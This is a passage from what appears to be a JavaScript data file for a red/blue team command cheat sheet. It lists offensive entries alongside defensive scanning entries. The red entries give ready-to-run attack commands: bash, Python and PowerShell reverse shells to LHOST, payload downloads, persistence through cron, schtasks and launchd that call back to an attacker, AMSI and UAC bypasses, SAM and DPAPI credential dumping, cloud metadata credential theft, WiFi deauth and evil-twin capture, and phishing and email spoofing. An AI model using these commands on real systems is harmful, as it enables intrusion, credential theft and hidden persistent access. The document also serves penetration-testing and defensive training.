      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'artifacts', owasp: ['A09'] },

    // ── Web Hardening (NEW - OWASP focused) ──────────────
    { id: 'blue-csp-check', title: 'CSP Header Audit', team: 'blue', category: 'hardening',
      description: 'Validate Content-Security-Policy header against best practices.',
      tags: ['csp', 'headers', 'xss'], command: 'curl -sI https://TARGET | grep -i content-security-policy\n# Test with: https://csp-evaluator.withgoogle.com/',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A03', 'A05'] },
    { id: 'blue-cors-check', title: 'CORS Misconfiguration Check', team: 'blue', category: 'hardening',
      description: 'Test for overly permissive CORS headers.',
      tags: ['cors', 'headers', 'web'], command: 'curl -sI -H "Origin: https://evil.com" https://TARGET/api | grep -i "access-control"',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'blue-dep-check', title: 'OWASP Dependency Check', team: 'blue', category: 'hardening',
      description: 'Scan project dependencies for known CVEs.',
      tags: ['dependency-check', 'cve', 'sca'], command: 'dependency-check --project "myapp" --scan /path/to/project --format HTML --out dep-report.html',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'blue-trivy-scan', title: 'Trivy Container Scan', team: 'blue', category: 'hardening',
      description: 'Scan Docker images for vulnerabilities.',
      tags: ['trivy', 'docker', 'container'], command: 'trivy image --severity HIGH,CRITICAL TARGET:latest',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'blue-semgrep', title: 'Semgrep SAST Scan', team: 'blue', category: 'hardening',
      description: 'Static analysis for common vulnerability patterns.',
      tags: ['semgrep', 'sast', 'code'], command: 'semgrep --config=p/owasp-top-ten /path/to/source',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A03', 'A04'] },
    { id: 'blue-zap-scan', title: 'OWASP ZAP Scan', team: 'blue', category: 'hardening',
      description: 'Run OWASP ZAP automated scan against web app.',
      tags: ['zap', 'dast', 'web'], command: 'zap-cli quick-scan -s all -r https://TARGET\n# or Docker:\ndocker run -t zaproxy/zap-stable zap-baseline.py -t https://TARGET',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A03', 'A05'] },

    // ═══════════════════════════════════════════════════════
    //  CLOUD & CONTAINER — AWS, Azure, Docker, K8s
    // ═══════════════════════════════════════════════════════
    { id: 'aws-enum-s3', title: 'AWS S3 Bucket Enum', team: 'red', category: 'cloud',
      description: 'Enumerate public S3 buckets and list contents.',
      tags: ['aws', 'cloud', 's3'], command: 'aws s3 ls s3://DOMAIN --no-sign-request\n# Brute-force bucket names:\nfor b in $(cat buckets.txt); do aws s3 ls s3://$b --no-sign-request 2>/dev/null && echo "OPEN: $b"; done',
      killchain: 'recon', attack: ['reconnaissance', 'collection'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'aws-enum-iam', title: 'AWS IAM Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate IAM users, roles, and policies with stolen creds.',
      tags: ['aws', 'cloud', 'iam', 'pacu'], command: 'aws sts get-caller-identity\naws iam list-users\naws iam list-roles\naws iam list-attached-user-policies --user-name USER',
      killchain: 'recon', attack: ['discovery', 'credential-access'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'aws-metadata', title: 'AWS Metadata SSRF', team: 'red', category: 'cloud',
      description: 'Access EC2 instance metadata via SSRF (IMDSv1).',
      tags: ['aws', 'cloud', 'ssrf', 'metadata'], command: 'curl -s http://169.254.169.254/latest/meta-data/\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\ncurl -s http://169.254.169.254/latest/user-data',
      killchain: 'exploitation', attack: ['credential-access', 'collection'], pyramid: 'ttps', owasp: ['A10'] },
    { id: 'azure-enum', title: 'Azure AD Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate Azure AD tenant, users, and apps.',
      tags: ['azure', 'cloud', 'aad'], command: '# Check tenant exists:\ncurl -s "https://login.microsoftonline.com/DOMAIN/.well-known/openid-configuration" | jq .token_endpoint\n# AADInternals:\nInvoke-AADIntReconAsOutsider -DomainName DOMAIN',
      killchain: 'recon', attack: ['reconnaissance', 'discovery'], pyramid: 'domains', owasp: ['A01'] },
    { id: 'docker-escape', title: 'Docker Container Escape', team: 'red', category: 'cloud',
      description: 'Check for container escape vectors.',
      tags: ['docker', 'container', 'escape'], command: '# Check if in container:\ncat /proc/1/cgroup | grep -i docker\n# Mounted docker socket?\nls -la /var/run/docker.sock\n# Privileged container escape:\nmount /dev/sda1 /mnt && chroot /mnt',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'k8s-enum', title: 'Kubernetes Enumeration', team: 'red', category: 'cloud',
      description: 'Enumerate K8s resources from a compromised pod.',
      tags: ['kubernetes', 'k8s', 'cloud'], command: '# Check if in K8s:\nenv | grep KUBERNETES\nls /var/run/secrets/kubernetes.io/serviceaccount/\n# Enumerate with token:\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\ncurl -sk https://kubernetes.default/api/v1/namespaces -H "Authorization: Bearer $TOKEN"',
      killchain: 'recon', attack: ['discovery'], pyramid: 'ttps', owasp: ['A01', 'A05'] },
    { id: 'prowler-audit', title: 'Prowler AWS Audit', team: 'blue', category: 'cloud',
      description: 'AWS security best practices assessment.',
      tags: ['prowler', 'aws', 'cloud', 'audit'], command: 'prowler aws --severity critical high\n# Specific checks:\nprowler aws -c s3_bucket_public_access iam_root_mfa_enabled',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'scoutsuite', title: 'ScoutSuite Cloud Audit', team: 'blue', category: 'cloud',
      description: 'Multi-cloud security auditing tool (AWS, Azure, GCP).',
      tags: ['scoutsuite', 'cloud', 'audit'], command: 'scout aws --profile default\nscout azure --cli',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: ['A05'] },

    // ═══════════════════════════════════════════════════════
    //  WIRELESS / WiFi
    // ═══════════════════════════════════════════════════════
    { id: 'airmon-start', title: 'Enable Monitor Mode', team: 'red', category: 'wireless',
      description: 'Put WiFi adapter in monitor mode for sniffing.',
      tags: ['aircrack-ng', 'wifi', 'monitor'], command: 'airmon-ng check kill\nairmon-ng start wlan0',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'airodump', title: 'WiFi Network Scan', team: 'red', category: 'wireless',
      description: 'Scan for nearby wireless networks and clients.',
      tags: ['aircrack-ng', 'wifi', 'scan'], command: 'airodump-ng wlan0mon\n# Target specific channel/BSSID:\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: [] },
    { id: 'aireplay-deauth', title: 'WiFi Deauth Attack', team: 'red', category: 'wireless',
      description: 'Force client disconnection to capture WPA handshake.',
      tags: ['aircrack-ng', 'wifi', 'deauth'], command: 'aireplay-ng -0 5 -a BSSID -c CLIENT_MAC wlan0mon\n# Then crack captured handshake:\naircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: [] },
    { id: 'bettercap-wifi', title: 'Bettercap WiFi', team: 'red', category: 'wireless',
      description: 'Swiss army knife for WiFi attacks — deauth, probe, evil twin.',
      tags: ['bettercap', 'wifi'], command: 'bettercap -iface wlan0mon\n# In bettercap:\nwifi.recon on\nwifi.show\nwifi.deauth AA:BB:CC:DD:EE:FF',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'tools', owasp: [] },
    { id: 'wifite', title: 'Wifite Automated WiFi', team: 'red', category: 'wireless',
      description: 'Automated WiFi auditing — WEP/WPA/WPS attacks.',
      tags: ['wifite', 'wifi', 'automated'], command: 'wifite --kill\n# Target specific network:\nwifite -e "TARGET_SSID" -dict /usr/share/wordlists/rockyou.txt',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'eaphammer', title: 'EAPHammer Evil Twin', team: 'red', category: 'wireless',
      description: 'Rogue AP for WPA-Enterprise credential capture.',
      tags: ['eaphammer', 'wifi', 'evil-twin'], command: 'eaphammer --bssid AA:BB:CC:DD:EE:FF --essid "CorpWiFi" --channel 6 --interface wlan0 --auth wpa-eap --creds',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'ttps', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  WINDOWS POST-EXPLOITATION
    // ═══════════════════════════════════════════════════════
    { id: 'win-sysinfo', title: 'Windows System Info', team: 'red', category: 'winpost',
      description: 'Gather OS version, patches, network info on Windows target.',
      tags: ['windows', 'enum', 'post-exploitation'], command: 'systeminfo\nwhoami /all\nipconfig /all\nnetstat -ano\nnet user\nnet localgroup administrators',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'win-powerview', title: 'PowerView AD Recon', team: 'red', category: 'winpost',
      description: 'PowerView domain enumeration from compromised Windows host.',
      tags: ['powershell', 'powerview', 'ad'], command: 'IEX(IWR https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1)\nGet-Domain\nGet-DomainUser -Identity USER\nGet-DomainGroup -AdminCount\nFind-DomainShare -CheckShareAccess\nInvoke-ShareFinder',
      killchain: 'recon', attack: ['discovery', 'reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'win-rubeus', title: 'Rubeus Kerberos Attacks', team: 'red', category: 'winpost',
      description: 'Kerberos abuse — ticket extraction, roasting, delegation.',
      tags: ['rubeus', 'kerberos', 'windows'], command: '# Kerberoasting:\nRubeus.exe kerberoast /outfile:hashes.txt\n# AS-REP Roasting:\nRubeus.exe asreproast /outfile:asrep.txt\n# Dump TGT:\nRubeus.exe dump /luid:0x3e4 /nowrap',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'tools', owasp: [] },
    { id: 'win-sharphound', title: 'SharpHound Collection', team: 'red', category: 'winpost',
      description: 'BloodHound data collection from Windows (C# native).',
      tags: ['sharphound', 'bloodhound', 'ad', 'windows'], command: '.\\SharpHound.exe -c All --outputdirectory C:\\temp\n# Or via PowerShell:\nIEX(IWR https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1)\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\temp',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'win-token-impersonate', title: 'Token Impersonation', team: 'red', category: 'winpost',
      description: 'Impersonate another user token (requires SeImpersonatePrivilege).',
      tags: ['windows', 'token', 'privesc'], command: '# PrintSpoofer:\nPrintSpoofer.exe -c "C:\\temp\\rev.exe"\n# GodPotato (any Windows):\nGodPotato.exe -cmd "C:\\temp\\rev.exe"\n# JuicyPotato (Win10 < 1809):\nJuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "C:\\temp\\rev.exe" -t *',
      killchain: 'actions', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'win-sam-dump', title: 'SAM Database Dump', team: 'red', category: 'winpost',
      description: 'Dump local password hashes from SAM via registry.',
      tags: ['windows', 'sam', 'credentials'], command: 'reg save HKLM\\SAM C:\\temp\\sam\nreg save HKLM\\SYSTEM C:\\temp\\system\n# Then on attacker:\nimpacket-secretsdump -sam sam -system system LOCAL',
      killchain: 'actions', attack: ['credential-access'], pyramid: 'hashes', owasp: ['A02'] },
    { id: 'win-dpapi', title: 'DPAPI Credential Extraction', team: 'red', category: 'winpost',
      description: 'Extract saved credentials protected by DPAPI (browser passwords, WiFi keys).',
      tags: ['mimikatz', 'dpapi', 'windows', 'credentials'], command: 'mimikatz.exe "dpapi::cred /in:C:\\Users\\USER\\AppData\\Local\\Microsoft\\Credentials\\*" "exit"\n# Or with SharpDPAPI:\nSharpDPAPI.exe triage',
      killchain: 'actions', attack: ['credential-access', 'collection'], pyramid: 'tools', owasp: ['A02'] },
    { id: 'win-amsi-bypass', title: 'AMSI Bypass', team: 'red', category: 'winpost',
      description: 'Bypass AntiMalware Scan Interface for PowerShell execution.',
      tags: ['amsi', 'windows', 'evasion', 'powershell'], command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)\n# Then load tools:\nIEX(IWR https://LHOST/PowerView.ps1)',
      killchain: 'exploitation', attack: ['defense-evasion', 'execution'], pyramid: 'ttps', owasp: [] },
    { id: 'win-uac-bypass', title: 'UAC Bypass', team: 'red', category: 'winpost',
      description: 'Bypass User Account Control to get high-integrity shell.',
      tags: ['windows', 'uac', 'privesc'], command: '# fodhelper.exe bypass:\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d "cmd.exe /c C:\\temp\\rev.exe" /f\nREG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /d "" /f\nfodhelper.exe',
      killchain: 'actions', attack: ['privilege-escalation', 'defense-evasion'], pyramid: 'ttps', owasp: ['A01'] },

    // ═══════════════════════════════════════════════════════
    //  SOCIAL ENGINEERING / PHISHING
    // ═══════════════════════════════════════════════════════
    { id: 'gophish', title: 'GoPhish Campaign', team: 'red', category: 'social',
      description: 'Open-source phishing framework — create campaigns, track clicks.',
      tags: ['gophish', 'phishing', 'social'], command: '# Start GoPhish server:\n./gophish\n# Access admin panel: https://127.0.0.1:3333\n# Default: admin/gophish\n# Create: Sending Profile → Email Template → Landing Page → Users → Campaign',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: [] },
    { id: 'setoolkit', title: 'SET Toolkit', team: 'red', category: 'social',
      description: 'Social Engineering Toolkit — credential harvester, phishing, HID attacks.',
      tags: ['setoolkit', 'phishing', 'social'], command: 'setoolkit\n# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method\n# 2) Site Cloner → Enter TARGET URL',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'evilginx', title: 'Evilginx2 MitM Phish', team: 'red', category: 'social',
      description: 'Reverse proxy phishing — captures session tokens, bypasses MFA.',
      tags: ['evilginx', 'phishing', 'mfa-bypass'], command: 'evilginx2 -p ./phishlets\n# In evilginx:\nphishlets hostname outlook DOMAIN\nphishlets enable outlook\nlures create outlook\nlures get-url 0',
      killchain: 'delivery', attack: ['initial-access', 'credential-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'swaks-email', title: 'Swaks Email Spoof', team: 'red', category: 'social',
      description: 'Send spoofed emails for phishing tests (SMTP testing).',
      tags: ['swaks', 'email', 'spoof', 'social'], command: 'swaks --to victim@DOMAIN --from ceo@DOMAIN --header "Subject: Urgent" --body "Click here: https://LHOST/phish" --server TARGET',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'domains', owasp: [] },

    // ═══════════════════════════════════════════════════════
    //  OS-VARIANT SNIPPETS — multi-OS with commands object
    // ═══════════════════════════════════════════════════════
    { id: 'download-file', title: 'File Download (Multi-OS)', team: 'red', category: 'transfer',
      description: 'Download a file from attacker server — OS-specific variants.',
      tags: ['wget', 'curl', 'powershell', 'transfer'],
      commands: {
        linux: 'wget https://LHOST:8000/payload -O /tmp/payload\ncurl -o /tmp/payload https://LHOST:8000/payload',
        windows: 'certutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe\npowershell -c "IWR -Uri https://LHOST:8000/payload.exe -OutFile C:\\Windows\\Temp\\payload.exe"',
        macos: 'curl -o /tmp/payload https://LHOST:8000/payload',
      },
      command: '# Linux:\nwget https://LHOST:8000/payload -O /tmp/payload\n# Windows:\ncertutil -urlcache -split -f https://LHOST:8000/payload.exe C:\\Windows\\Temp\\payload.exe\n# macOS:\ncurl -o /tmp/payload https://LHOST:8000/payload',
      killchain: 'delivery', attack: ['command-control'], pyramid: 'ips', owasp: [] },
    { id: 'reverse-shell-multi', title: 'Reverse Shell (Multi-OS)', team: 'red', category: 'shells',
      description: 'Reverse shell — auto-selects OS-appropriate variant.',
      tags: ['reverse-shell', 'multi-os'],
      commands: {
        linux: 'bash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"',
        windows: '$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
        macos: 'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\'',
      },
      command: '# Linux:\nbash -c "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"\n# Windows:\npowershell -nop -c "$client = New-Object Net.Sockets.TCPClient(\'LHOST\',LPORT)..."\n# macOS:\npython3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));...\'',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'ttps', owasp: [] },
    { id: 'persist-multi', title: 'Persistence (Multi-OS)', team: 'red', category: 'persist',
      description: 'Install persistence mechanism — auto-selects OS variant.',
      tags: ['persistence', 'multi-os'],
      commands: {
        linux: '(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c \'bash -i >& /dev/tcp/LHOST/LPORT 0>&1\'") | crontab -',
        windows: 'schtasks /create /sc MINUTE /mo 5 /tn "WindowsUpdate" /tr "powershell -ep bypass -w hidden -c IEX(IWR https://LHOST/shell.ps1)" /ru SYSTEM',
        macos: 'cat <<EOF > ~/Library/LaunchAgents/com.update.plist\n<?xml version="1.0"?>\n<plist version="1.0"><dict>\n<key>Label</key><string>com.update</string>\n<key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i >& /dev/tcp/LHOST/LPORT 0>&1</string></array>\n<key>StartInterval</key><integer>300</integer>\n</dict></plist>\nEOF\nlaunchctl load ~/Library/LaunchAgents/com.update.plist',
      },
      command: '# Linux: crontab\n# Windows: schtasks\n# macOS: launchd plist\n# Select OS above for specific command',
      killchain: 'installation', attack: ['persistence'], pyramid: 'ttps', owasp: [] },
    { id: 'enum-network-multi', title: 'Network Enum (Multi-OS)', team: 'red', category: 'enum',
      description: 'List open ports and active connections — OS-specific.',
      tags: ['network', 'enum', 'multi-os'],
      commands: {
        linux: 'ss -tulpen\nlsof -i -P -n | grep ESTABLISHED\nip a\nip route',
        windows: 'netstat -ano\nipconfig /all\nroute print\narp -a',
        macos: 'lsof -i -P -n | grep ESTABLISHED\nnetstat -an\nifconfig\nnetstat -rn',
      },
      command: '# Linux: ss -tulpen\n# Windows: netstat -ano\n# macOS: lsof -i -P -n\n# Select OS above for full command',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },
    { id: 'enum-users-multi', title: 'User Enumeration (Multi-OS)', team: 'red', category: 'enum',
      description: 'List users and groups — OS-specific.',
      tags: ['users', 'enum', 'multi-os'],
      commands: {
        linux: 'cat /etc/passwd\ngetent group sudo\nwho\nlast -10',
        windows: 'net user\nnet localgroup administrators\nquery user\nwhoami /all',
        macos: 'dscl . list /Users\ndscl . read /Groups/admin GroupMembership\nwho\nlast -10',
      },
      command: '# Linux: cat /etc/passwd\n# Windows: net user\n# macOS: dscl . list /Users\n# Select OS above for full command',
      killchain: 'recon', attack: ['discovery'], pyramid: 'artifacts', owasp: [] },

    // ── Mobile Pentesting ──────────────────────────────────
    { id: 'adb-devices', title: 'ADB Device List', team: 'red', category: 'mobile',
      description: 'List connected Android devices.',
      tags: ['adb', 'android', 'mobile'], command: 'adb devices -l',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },
    { id: 'adb-shell', title: 'ADB Shell', team: 'red', category: 'mobile',
      description: 'Open interactive shell on Android device.',
      tags: ['adb', 'android', 'mobile'], command: 'adb shell',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: [] },
    { id: 'apk-decompile', title: 'APK Decompile (apktool)', team: 'red', category: 'mobile',
      description: 'Decompile APK to smali + resources for analysis.',
      tags: ['apktool', 'android', 'reverse'], command: 'apktool d target.apk -o decompiled/',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04'] },
    { id: 'jadx-decompile', title: 'JADX Java Decompile', team: 'red', category: 'mobile',
      description: 'Decompile APK to readable Java source code.',
      tags: ['jadx', 'android', 'reverse'], command: 'jadx -d jadx_output/ target.apk',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04'] },
    { id: 'frida-enumerate', title: 'Frida App Enumerate', team: 'red', category: 'mobile',
      description: 'List running apps and processes via Frida dynamic instrumentation.',
      tags: ['frida', 'mobile', 'hooking'], command: 'frida-ps -Uai',
      killchain: 'recon', attack: ['discovery'], pyramid: 'tools', owasp: [] },
    { id: 'frida-bypass-ssl', title: 'Frida SSL Pin Bypass', team: 'red', category: 'mobile',
      description: 'Bypass SSL certificate pinning with Frida script.',
      tags: ['frida', 'mobile', 'ssl'], command: 'frida -U -f com.target.app -l ssl_bypass.js --no-pause',
      killchain: 'exploitation', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A02'] },
    { id: 'objection-explore', title: 'Objection Explore', team: 'red', category: 'mobile',
      description: 'Runtime mobile security assessment with objection.',
      tags: ['objection', 'mobile', 'frida'], command: 'objection -g com.target.app explore',
      killchain: 'exploitation', attack: ['discovery', 'defense-evasion'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'mobsf-scan', title: 'MobSF Static Analysis', team: 'blue', category: 'mobile',
      description: 'Mobile Security Framework — automated static analysis of APK/IPA.',
      tags: ['mobsf', 'mobile', 'sast'], command: 'docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A04', 'A06'] },

    // ── API Testing ────────────────────────────────────────
    { id: 'api-jwt-decode', title: 'JWT Decode', team: 'red', category: 'api',
      description: 'Decode JWT token without verification to inspect claims.',
      tags: ['jwt', 'api', 'auth'], command: 'echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool',
      killchain: 'exploitation', attack: ['credential-access'], pyramid: 'ttps', owasp: ['A02', 'A07'] },
    { id: 'api-jwt-none', title: 'JWT "none" Algorithm Attack', team: 'red', category: 'api',
      description: 'Test if API accepts JWT with alg:none (no signature verification).',
      tags: ['jwt', 'api', 'auth'], command: '# Craft alg:none JWT:\npython3 -c "\nimport base64, json\nheader = base64.urlsafe_b64encode(json.dumps({\'alg\':\'none\',\'typ\':\'JWT\'}).encode()).rstrip(b\'=\')\npayload = base64.urlsafe_b64encode(json.dumps({\'sub\':\'admin\',\'role\':\'admin\'}).encode()).rstrip(b\'=\')\nprint(header.decode() + \'.\' + payload.decode() + \'.\')\n"',
      killchain: 'exploitation', attack: ['defense-evasion', 'credential-access'], pyramid: 'ttps', owasp: ['A02', 'A07'] },
    { id: 'api-bola', title: 'BOLA / IDOR Test', team: 'red', category: 'api',
      description: 'Test for Broken Object Level Authorization — access other users resources.',
      tags: ['api', 'idor', 'bola'], command: '# As user A, note resource ID:\ncurl -s -H "Authorization: Bearer TOKEN_A" https://TARGET/api/users/1/profile\n# Try with user B token:\ncurl -s -H "Authorization: Bearer TOKEN_B" https://TARGET/api/users/1/profile',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A01'] },
    { id: 'api-mass-assignment', title: 'Mass Assignment Test', team: 'red', category: 'api',
      description: 'Test if API accepts unintended fields (role, admin, isVerified).',
      tags: ['api', 'mass-assignment'], command: 'curl -X PUT https://TARGET/api/users/me \\\n  -H "Authorization: Bearer TOKEN" \\\n  -H "Content-Type: application/json" \\\n  -d \'{"name":"test","role":"admin","isAdmin":true,"verified":true}\'',
      killchain: 'exploitation', attack: ['privilege-escalation'], pyramid: 'ttps', owasp: ['A01', 'A04'] },
    { id: 'api-rate-limit', title: 'Rate Limit Test', team: 'red', category: 'api',
      description: 'Test API rate limiting by rapid-fire requests.',
      tags: ['api', 'rate-limit'], command: 'for i in $(seq 1 100); do curl -s -o /dev/null -w "%{http_code}" https://TARGET/api/login -d \'{"user":"admin","pass":"test"}\'; echo; done | sort | uniq -c',
      killchain: 'exploitation', attack: ['initial-access'], pyramid: 'ttps', owasp: ['A07'] },
    { id: 'api-graphql-introspect', title: 'GraphQL Introspection', team: 'red', category: 'api',
      description: 'Dump the full GraphQL schema via introspection query.',
      tags: ['graphql', 'api', 'introspection'], command: 'curl -s https://TARGET/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name fields { name type { name } } } } }"}\'  | python3 -m json.tool',
      killchain: 'recon', attack: ['reconnaissance', 'discovery'], pyramid: 'artifacts', owasp: ['A01', 'A05'] },
    { id: 'api-swagger-enum', title: 'Swagger/OpenAPI Enum', team: 'red', category: 'api',
      description: 'Enumerate API endpoints from publicly accessible docs.',
      tags: ['api', 'swagger', 'openapi'], command: '# Common OpenAPI doc paths:\ncurl -s https://TARGET/swagger.json | python3 -m json.tool\ncurl -s https://TARGET/api-docs\ncurl -s https://TARGET/v2/api-docs\ncurl -s https://TARGET/openapi.json',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'artifacts', owasp: ['A05'] },
    { id: 'api-postman-collection', title: 'Postman Collection Import', team: 'red', category: 'api',
      description: 'Convert Postman collection to curl commands for testing.',
      tags: ['postman', 'api'], command: 'npx postman-to-curl collection.json',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: [] },

    // ── Container Defense / Hardening ──────────────────────
    { id: 'docker-bench', title: 'Docker Bench Security', team: 'blue', category: 'container-defense',
      description: 'CIS Docker Benchmark automated audit.',
      tags: ['docker', 'cis', 'hardening'], command: 'docker run --rm --net host --pid host --userns host --cap-add audit_control \\\n  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \\\n  -v /var/lib:/var/lib:ro -v /var/run/docker.sock:/var/run/docker.sock:ro \\\n  -v /etc:/etc:ro -v /usr/lib/systemd:/usr/lib/systemd:ro \\\n  docker/docker-bench-security',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'trivy-image', title: 'Trivy Image Scan', team: 'blue', category: 'container-defense',
      description: 'Scan a Docker image for CVEs, secrets, and misconfigurations.',
      tags: ['trivy', 'docker', 'vuln-scan'], command: 'trivy image --severity HIGH,CRITICAL --format table TARGET_IMAGE:latest',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'grype-scan', title: 'Grype Vulnerability Scan', team: 'blue', category: 'container-defense',
      description: 'Fast vulnerability scanner for container images and filesystems.',
      tags: ['grype', 'docker', 'vuln-scan'], command: 'grype TARGET_IMAGE:latest --only-fixed --fail-on high',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'falco-runtime', title: 'Falco Runtime Security', team: 'blue', category: 'container-defense',
      description: 'Cloud-native runtime security — detect abnormal container behavior.',
      tags: ['falco', 'runtime', 'detection'], command: 'docker run --rm -i -t \\\n  --privileged \\\n  -v /var/run/docker.sock:/host/var/run/docker.sock \\\n  -v /proc:/host/proc:ro \\\n  falcosecurity/falco:latest',
      killchain: 'c2', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A09'] },
    { id: 'kube-bench', title: 'Kube-bench CIS Audit', team: 'blue', category: 'container-defense',
      description: 'Check Kubernetes cluster against CIS Kubernetes Benchmark.',
      tags: ['kubernetes', 'cis', 'hardening'], command: 'kubectl run kube-bench --image=aquasec/kube-bench:latest --restart=Never -- run --targets=master,node,etcd,policies\nkubectl logs kube-bench\nkubectl delete pod kube-bench',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'kubescape-scan', title: 'Kubescape Security Scan', team: 'blue', category: 'container-defense',
      description: 'Kubernetes security posture management with NSA/CISA framework.',
      tags: ['kubernetes', 'kubescape', 'hardening'], command: 'kubescape scan --enable-host-scan --format pretty-printer --submit',
      killchain: 'recon', attack: ['reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'network-policy-deny', title: 'K8s Default Deny NetworkPolicy', team: 'blue', category: 'container-defense',
      description: 'Default deny all ingress/egress traffic in a namespace.',
      tags: ['kubernetes', 'network-policy', 'hardening'], command: 'kubectl apply -f - <<EOF\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: default-deny-all\nspec:\n  podSelector: {}\n  policyTypes: [Ingress, Egress]\nEOF',
      killchain: 'actions', attack: ['defense-evasion'], pyramid: 'ttps', owasp: ['A05'] },
    { id: 'cosign-verify', title: 'Cosign Image Verification', team: 'blue', category: 'container-defense',
      description: 'Verify container image signatures with Sigstore cosign.',
      tags: ['cosign', 'sigstore', 'supply-chain'], command: 'cosign verify --key cosign.pub TARGET_IMAGE:latest',
      killchain: 'delivery', attack: ['initial-access'], pyramid: 'tools', owasp: ['A08'] },
  ];

  // ═══════════════════════════════════════════════════════════
